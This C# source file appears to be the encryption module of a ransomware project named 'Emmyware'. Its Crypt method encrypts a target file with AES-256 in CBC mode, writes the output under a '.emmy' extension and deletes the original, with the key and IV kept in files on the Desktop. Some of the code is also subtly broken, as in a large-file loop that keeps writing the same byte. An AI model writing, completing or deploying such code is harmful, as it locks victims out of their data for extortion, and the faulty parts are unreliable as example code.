using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace Emmyware
{
    public class EncryptionLogic
    {
        internal static byte[] randomKey { get; set; }
        internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomkey.bin";

        internal static byte[] randomIV { get; set; }
        internal static readonly string IVFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomiv.bin";

        public static void Crypt(string path, bool IsDecrypt = false)
        {
            using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.IV = randomIV;
                rijndaelManaged.Key = randomKey;
                rijndaelManaged.KeySize = 256;            // AES-256 (so top level am I right?)
                rijndaelManaged.BlockSize = 128;
                rijndaelManaged.Mode = CipherMode.CBC;    // CBC mode
                rijndaelManaged.Padding = PaddingMode.PKCS7;

                ICryptoTransform transform = IsDecrypt ? rijndaelManaged.CreateDecryptor(randomKey, randomIV) : rijndaelManaged.CreateEncryptor(randomKey, randomIV);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                    {
                        byte[] fileData = File.ReadAllBytes(path);
                        if (fileData.Length >= 2147483647L) // 2 GB
                        {
                            while (cryptoStream.Position != fileData.Length - 1L)
                            {
                                cryptoStream.Write(fileData, 0, 1);
                            }
                        }
                        else
                        {
                            cryptoStream.Write(fileData, 0, fileData.Length);
                        }
                    }

                    File.WriteAllBytes(IsDecrypt ? path.Replace(".emmy", string.Empty) : (path + ".emmy"), memoryStream.ToArray());
                    File.Delete(path);
                }
            }
        }
    }
}
